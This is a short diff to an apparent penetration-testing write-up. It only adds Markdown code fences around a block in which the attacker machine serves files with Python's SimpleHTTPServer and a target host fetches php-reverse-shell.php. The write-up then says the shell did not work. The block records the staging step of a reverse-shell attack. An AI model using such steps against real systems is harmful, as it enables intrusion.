@@ -248,6 +248,7 @@ To test this out, a webserver needs to be running on the attacker machine.
 
 One can simply use python SimpleHTTPServer:
 
+```
 lifesfun:/var/www/html\# python -m SimpleHTTPServer 80
 
 Serving HTTP on 0.0.0.0 port 80 ...
@@ -257,6 +258,7 @@ Serving HTTP on 0.0.0.0 port 80 ...
 
 192.168.211.150 - - [26/Jan/2020 20:40:48] "GET /php-reverse-shell.php HTTP/1.0"
 200 -
+```
 
 However, the reverse shell didn't work.
 
